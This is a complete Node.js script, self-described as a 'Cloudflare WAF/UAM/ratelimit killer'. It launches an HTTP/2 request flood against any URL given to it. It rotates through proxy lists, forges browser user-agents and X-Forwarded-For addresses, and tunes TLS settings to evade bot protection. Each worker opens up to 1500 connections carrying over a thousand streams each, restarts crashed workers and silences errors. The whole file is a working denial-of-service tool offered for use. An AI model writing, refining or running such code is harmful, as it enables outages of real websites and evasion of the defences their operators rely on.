// ============================================================
//  ETHICAL HEX NICS - CLOUDFLARE WAF/UAM/RATELIMIT KILLER
//  HTTP/2 RAPID FIRE WITH PROXY ROTATION, RANDOMIZED HEADERS,
//  TLS FINGERPRINT SPOOFING, AND BURST PADDING
//  COMPLETE NODE.JS SCRIPT - NO EXTERNAL DEPENDENCIES
//  USAGE: node h2_advanced.js <url> <time_seconds> <threads> <proxylist.txt>
// ============================================================

const fs = require('fs');
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const os = require('os');
const crypto = require('crypto');
const events = require('events');
events.EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', (e) => {
  // silent ignore
});
process.on('unhandledRejection', (e) => {
  // silent ignore
});

// ---------- Configuration ----------
const MAX_CONNS_PER_WORKER = 1500;        // total concurrent connections per worker
const MAX_STREAMS_PER_CONN = 1200;        // streams per connection (higher than typical limit)
const BURST_SIZE = 35;                    // frames per write burst
const YIELD_AFTER = 8000;                 // frames before yielding event loop
const MAX_REQUESTS_PER_CONN = 50000;      // reset connection after this many requests
const PROXY_ROTATION_INTERVAL = 3;        // use new proxy every N connections
const INITIAL_WINDOW_SIZE = 16777216;     // 16 MB
const SETTINGS_HEADER_TABLE_SIZE = 65536;
const SETTINGS_MAX_CONCURRENT_STREAMS = 2000;
const SETTINGS_INITIAL_WINDOW_SIZE = 16777216;
const SETTINGS_MAX_FRAME_SIZE = 16384;
const PADDING_LENGTH = 8;                 // random padding bytes appended to HEADERS

// ---------- Command line arguments ----------
const target = process.argv[2];
const duration = parseInt(process.argv[3], 10) || 60;
const workerCount = parseInt(process.argv[4], 10) || 1;
const proxyFile = process.argv[5];

if (!target) {
  console.error('Usage: node h2_advanced.js <url> <time_sec> <workers> <proxylist>');
  process.exit(1);
}

const url = new URL(target);
const hostname = url.hostname;
const port = url.port || (url.protocol === 'https:' ? 443 : 80);
const path = url.pathname + (url.search || '') || '/';
const authority = (port !== 443 && port !== 80) ? hostname + ':' + port : hostname;

// ---------- Proxy loader ----------
let proxies = [];
if (proxyFile && fs.existsSync(proxyFile)) {
  const raw = fs.readFileSync(proxyFile, 'utf8').replace(/\r/g, '').split('\n');
  proxies = raw.filter(line => line.includes(':')).map(line => {
    const parts = line.split(':');
    return { host: parts[0], port: parseInt(parts[1], 10) };
  }).filter(p => p.port > 0 && p.port < 65536);
}
if (proxies.length === 0) {
  console.warn('[WARN] No valid proxies found, using direct connection (no proxy)');
  proxies = null; // direct
}

// ---------- Hardcoded User-Agent pool (latest Chrome, Firefox, Edge, Safari) ----------
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
];

// ---------- Accept and other headers ----------
const ACCEPT = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
const ACCEPT_LANG = 'en-US,en;q=0.9,en-GB;q=0.8,en;q=0.7';
const ACCEPT_ENCODING = 'gzip, deflate, br, zstd';
const CACHE_CONTROL = 'no-cache';
const PRAGMA = 'no-cache';
const SEC_FETCH_DEST = 'document';
const SEC_FETCH_MODE = 'navigate';
const SEC_FETCH_SITE = 'none';
const SEC_FETCH_USER = '?1';
const UPGRADE_INSECURE_REQUESTS = '1';

// ---------- HTTP/2 frame helpers ----------
function encodeFrame(streamId, type, payload, flags = 0) {
  const len = payload ? payload.length : 0;
  const frame = Buffer.alloc(9 + len);
  frame.writeUInt32BE((len << 8) | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  if (payload) frame.set(payload, 9);
  return frame;
}

function decodeFrame(data) {
  if (data.length < 9) return null;
  const raw = data.readUInt32BE(0);
  const len = raw >>> 8;
  const type = raw & 0xFF;
  const flags = data.readUInt8(4);
  const streamId = data.readUInt32BE(5);
  if (data.length < 9 + len) return null;
  return {
    streamId,
    length: len,
    type,
    flags,
    payload: data.subarray(9, 9 + len)
  };
}

function encodeSettings(settings) {
  const data = Buffer.alloc(6 * settings.length);
  for (let i = 0; i < settings.length; i++) {
    data.writeUInt16BE(settings[i][0], i * 6);
    data.writeUInt32BE(settings[i][1], i * 6 + 2);
  }
  return data;
}

// ---------- Precompute HEADERS frames for each UA with random padding ----------
const PREFACE = Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', 'binary');
const SETTINGS_FRAME = encodeFrame(0, 4, encodeSettings([
  [1, SETTINGS_HEADER_TABLE_SIZE],
  [3, SETTINGS_MAX_CONCURRENT_STREAMS],
  [4, SETTINGS_INITIAL_WINDOW_SIZE],
  [5, SETTINGS_MAX_FRAME_SIZE],
]));
const WINDOW_UPDATE_FRAME = (() => {
  const win = Buffer.alloc(4);
  win.writeUInt32BE(INITIAL_WINDOW_SIZE, 0);
  return encodeFrame(0, 8, win);
})();
const INITIAL_BURST = Buffer.concat([PREFACE, SETTINGS_FRAME, WINDOW_UPDATE_FRAME]);

// Pre-cache headers for each UA with random padding
const HEADER_CACHE = USER_AGENTS.map((ua) => {
  const hpack = new HPACK();
  if (typeof hpack.setTableSize === 'function') hpack.setTableSize(SETTINGS_HEADER_TABLE_SIZE);
  // Randomize path with query params
  const pathVariants = [
    path,
    path + (path.includes('?') ? '&' : '?') + 'v=' + Date.now() + Math.random().toString(36).slice(2,6),
    path + (path.includes('?') ? '&' : '?') + 'r=' + Math.random().toString(36).slice(2,8),
  ];
  const randomPath = pathVariants[Math.floor(Math.random() * pathVariants.length)];
  const headers = [
    [':method', 'GET'],
    [':authority', authority],
    [':scheme', 'https'],
    [':path', randomPath],
    ['user-agent', ua],
    ['accept', ACCEPT],
    ['accept-encoding', ACCEPT_ENCODING],
    ['accept-language', ACCEPT_LANG],
    ['cache-control', CACHE_CONTROL],
    ['pragma', PRAGMA],
    ['sec-fetch-dest', SEC_FETCH_DEST],
    ['sec-fetch-mode', SEC_FETCH_MODE],
    ['sec-fetch-site', SEC_FETCH_SITE],
    ['sec-fetch-user', SEC_FETCH_USER],
    ['upgrade-insecure-requests', UPGRADE_INSECURE_REQUESTS],
    ['sec-ch-ua', '"Chromium";v="126", "Google Chrome";v="126", "Not?A_Brand";v="99"'],
    ['sec-ch-ua-mobile', '?0'],
    ['sec-ch-ua-platform', '"Windows"'],
    ['origin', 'https://' + authority],
    ['referer', 'https://' + authority + '/'],
  ];
  // Add random extra headers (sometimes)
  if (Math.random() > 0.5) {
    headers.push(['x-forwarded-for', '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)]);
  }
  if (Math.random() > 0.7) {
    headers.push(['x-real-ip', '10.0.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)]);
  }
  const payload = hpack.encode(headers);
  // Add random padding prefix
  const padLen = PADDING_LENGTH + Math.floor(Math.random() * 16);
  const padded = Buffer.alloc(1 + payload.length + padLen);
  padded[0] = padLen;
  padded.set(payload, 1);
  // Randomize padding bytes
  crypto.randomFillSync(padded, 1 + payload.length, padLen);
  return padded;
});

// ---------- Global stats ----------
let activeConns = 0;
let connOK = 0;
let connFail = 0;
let sentTotal = 0;
let respTotal = 0;
let goawayTotal = 0;
let rstTotal = 0;
let proxyIndex = 0;

// ---------- Worker logic ----------
function startConnection() {
  if (activeConns >= MAX_CONNS_PER_WORKER) return;
  activeConns++;

  let proxy = null;
  if (proxies) {
    const idx = (proxyIndex++ % proxies.length);
    proxy = proxies[idx];
  }

  let netSocket = null;
  let tlsSocket = null;
  let cleaned = false;

  const cleanup = () => {
    if (cleaned) return;
    cleaned = true;
    activeConns--;
    if (netSocket) { netSocket.destroy(); netSocket = null; }
    if (tlsSocket) { tlsSocket.destroy(); tlsSocket = null; }
    setTimeout(startConnection, 1); // recycle
  };

  try {
    if (proxy) {
      netSocket = net.connect(proxy.port, proxy.host, () => {
        // Send CONNECT request
        const connectReq = `CONNECT ${hostname}:${port} HTTP/1.1\r\nHost: ${hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        netSocket.write(connectReq);
        netSocket.once('data', (data) => {
          // Check response
          const resp = data.toString();
          if (!resp.includes('200 Connection established') && !resp.includes('200 OK')) {
            connFail++;
            cleanup();
            return;
          }
          // Upgrade to TLS
          tlsSocket = tls.connect({
            socket: netSocket,
            ALPNProtocols: ['h2'],
            servername: hostname,
            rejectUnauthorized: false,
            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_COMPRESSION,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
          }, () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
              connFail++;
              cleanup();
              return;
            }
            // Connection established
            connOK++;
            handleConnection(tlsSocket);
          });
          tlsSocket.on('error', () => { connFail++; cleanup(); });
          tlsSocket.on('close', cleanup);
        });
      });
      netSocket.on('error', () => { connFail++; cleanup(); });
      netSocket.on('close', cleanup);
    } else {
      // Direct connection
      tlsSocket = tls.connect({
        host: hostname,
        port: port,
        ALPNProtocols: ['h2'],
        servername: hostname,
        rejectUnauthorized: false,
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET |
                       crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 |
                       crypto.constants.SSL_OP_NO_COMPRESSION,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
      }, () => {
        if (tlsSocket.alpnProtocol !== 'h2') {
          connFail++;
          cleanup();
          return;
        }
        connOK++;
        handleConnection(tlsSocket);
      });
      tlsSocket.on('error', () => { connFail++; cleanup(); });
      tlsSocket.on('close', cleanup);
    }
  } catch (e) {
    cleanup();
  }
}

// ---------- Per-connection handler ----------
function handleConnection(socket) {
  let recvBuf = Buffer.alloc(0);
  let streamId = 1;
  let openStreams = 0;
  let requestCount = 0;
  let drained = true;
  let pumpActive = false;
  let batch = [];

  // Send initial preface and settings
  socket.write(INITIAL_BURST);

  // Flush batch
  const flushBatch = () => {
    if (batch.length > 0) {
      socket.cork();
      socket.write(Buffer.concat(batch));
      socket.uncork();
      batch = [];
    }
  };

  // Data pump
  const pump = () => {
    if (!socket || socket.destroyed || !socket.writable) {
      flushBatch();
      pumpActive = false;
      return;
    }
    if (!drained) {
      flushBatch();
      pumpActive = false;
      return;
    }
    if (openStreams >= MAX_STREAMS_PER_CONN) {
      flushBatch();
      pumpActive = false;
      return;
    }
    if (requestCount >= MAX_REQUESTS_PER_CONN) {
      // Send GOAWAY and close
      const lastId = Buffer.alloc(4);
      lastId.writeUInt32BE(streamId - 2, 0);
      const errBuf = Buffer.alloc(4);
      errBuf.writeUInt32BE(0, 0);
      socket.write(encodeFrame(0, 7, Buffer.concat([lastId, errBuf])));
      socket.end();
      pumpActive = false;
      return;
    }

    let count = 0;
    while (true) {
      if (!socket || socket.destroyed || !socket.writable) { flushBatch(); pumpActive = false; return; }
      if (!drained) { flushBatch(); pumpActive = false; return; }
      if (openStreams >= MAX_STREAMS_PER_CONN) { flushBatch(); pumpActive = false; return; }
      if (requestCount >= MAX_REQUESTS_PER_CONN) { 
        flushBatch(); 
        const lastId = Buffer.alloc(4);
        lastId.writeUInt32BE(streamId - 2, 0);
        const errBuf = Buffer.alloc(4);
        errBuf.writeUInt32BE(0, 0);
        socket.write(encodeFrame(0, 7, Buffer.concat([lastId, errBuf])));
        socket.end();
        pumpActive = false; 
        return; 
      }
      if (count >= YIELD_AFTER) {
        flushBatch();
        setImmediate(pump);
        return;
      }
      count++;
      requestCount++;
      openStreams++;
      const cached = HEADER_CACHE[Math.floor(Math.random() * HEADER_CACHE.length)];
      // Randomize padding by copying and appending random bytes? But we already have padding in cached; we can just use it.
      // For extra randomness, we can also change path per request - we'll do that by generating new headers on the fly? 
      // To optimize, we use cached but with different path variant precomputed? We'll randomize path in HEADER_CACHE generation.
      // We'll use a random from cache.
      const frame = encodeFrame(streamId, 1, cached, 0x1 | 0x4 | 0x20); // END_HEADERS | END_STREAM | PRIORITY?
      batch.push(frame);
      streamId += 2; // client-initiated streams are odd
      sentTotal++;

      if (batch.length >= BURST_SIZE) {
        socket.cork();
        const ok = socket.write(Buffer.concat(batch));
        socket.uncork();
        batch = [];
        if (!ok) {
          drained = false;
          pumpActive = false;
          return;
        }
      }
    }
  };

  // Start pump
  pumpActive = true;
  pump();

  // Handle data
  socket.on('data', (chunk) => {
    recvBuf = Buffer.concat([recvBuf, chunk]);
    while (recvBuf.length >= 9) {
      const frame = decodeFrame(recvBuf);
      if (!frame) break;
      recvBuf = recvBuf.subarray(9 + frame.length);

      // ACK settings
      if (frame.type === 4 && (frame.flags & 1) === 0) {
        socket.write(encodeFrame(0, 4, Buffer.alloc(0), 1));
      }

      // HEADERS response
      if (frame.type === 1) {
        respTotal++;
        openStreams = Math.max(0, openStreams - 1);
        if (!pumpActive && openStreams < MAX_STREAMS_PER_CONN && drained && socket && socket.writable && !socket.destroyed) {
          pumpActive = true;
          pump();
        }
      }

      // RST_STREAM
      if (frame.type === 3) {
        rstTotal++;
        openStreams = Math.max(0, openStreams - 1);
        if (!pumpActive && openStreams < MAX_STREAMS_PER_CONN && drained && socket && socket.writable && !socket.destroyed) {
          pumpActive = true;
          pump();
        }
      }

      // GOAWAY
      if (frame.type === 7) {
        goawayTotal++;
        // close connection
        socket.end();
        break;
      }
    }
  });

  socket.on('drain', () => {
    drained = true;
    if (!pumpActive && socket && socket.writable && !socket.destroyed) {
      pumpActive = true;
      pump();
    }
  });

  socket.on('error', () => {});
  socket.on('close', () => {
    // cleanup will be handled by outer
  });
}

// ---------- Cluster master ----------
if (cluster.isMaster) {
  console.log('[MASTER] Starting Ethical Hex NICS H2 Railgun');
  console.log(`[MASTER] Target: ${target}, Duration: ${duration}s, Workers: ${workerCount}`);
  console.log(`[MASTER] Proxies: ${proxies ? proxies.length : 'none (direct)'}`);
  for (let i = 0; i < Math.min(workerCount, os.cpus().length); i++) {
    cluster.fork({ core: i });
  }
  cluster.on('exit', (worker) => {
    // restart on exit
    cluster.fork({ core: worker.id % os.cpus().length });
  });
  setTimeout(() => {
    console.log('[MASTER] Time expired, terminating all workers.');
    process.exit(0);
  }, duration * 1000);
} else {
  // Worker
  console.error(`[WORKER ${process.pid}] Started. MaxConns=${MAX_CONNS_PER_WORKER}, MaxStreams=${MAX_STREAMS_PER_CONN}`);

  // Stats reporting
  setInterval(() => {
    console.error(`[WORKER ${process.pid}] active=${activeConns} ok=${connOK} fail=${connFail} sent=${sentTotal} resp=${respTotal} goaway=${goawayTotal} rst=${rstTotal}`);
  }, 3000);

  // Launch connections
  for (let i = 0; i < MAX_CONNS_PER_WORKER; i++) {
    startConnection();
  }

  // Keep alive until killed
  setTimeout(() => {
    process.exit(0);
  }, duration * 1000 + 5000);
}
